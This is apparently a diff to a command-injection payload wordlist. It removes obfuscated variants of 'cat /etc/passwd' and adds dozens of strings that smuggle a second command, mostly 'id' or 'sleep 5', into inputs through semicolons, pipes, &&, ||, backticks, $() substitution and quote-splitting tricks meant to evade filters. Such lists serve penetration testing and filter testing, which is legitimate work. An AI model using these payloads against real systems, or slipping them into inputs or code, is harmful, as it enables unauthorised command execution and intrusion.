@@ -1,4 +1,58 @@
-c'a't /etc/passwd
-c"a"t /etc/passwd
-c\at /etc/passwd
-ca''t /etc/passwd
+;'id'
+;"id"
+;`id`
+;id''
+;id""
+;'i''d'
+;"i""d"
+;i'd'
+;i"d"
+;'i'd'
+;"i"d"
+;''+'id'
+;""+"id"
+;$'id'
+;$(echo 'id')
+;$(echo "id")
+;$(printf 'id')
+;$(printf "id")
+;"$(id)"
+;'$(id)'
+;"`id`"
+;'`id`'
+;&& 'id'
+;&& "id"
+;|| 'id'
+;|| "id"
+;| 'id'
+;| "id"
+;"id"; echo
+;'id'; echo
+;i\d
+;\id
+;i\'d
+;i\"d
+;i$'\x64'
+;i$'\144'
+;id
+;"id"
+;\'id\'
+;\"id\"
+;&& i'd'
+;&& i"d"
+;|| i'd'
+;|| i"d"
+test'; id; echo 'done
+test"; id; echo "done
+test'; sleep 5; echo '
+test"; sleep 5; echo "
+test`id`
+test$(id)
+"test$(id)"
+'test$(id)'
+input = '; id; '
+input = "; id; "
+input = `id`
+input = $(id)
+value=test'; id; echo 'x
+value=test"; id; echo "x
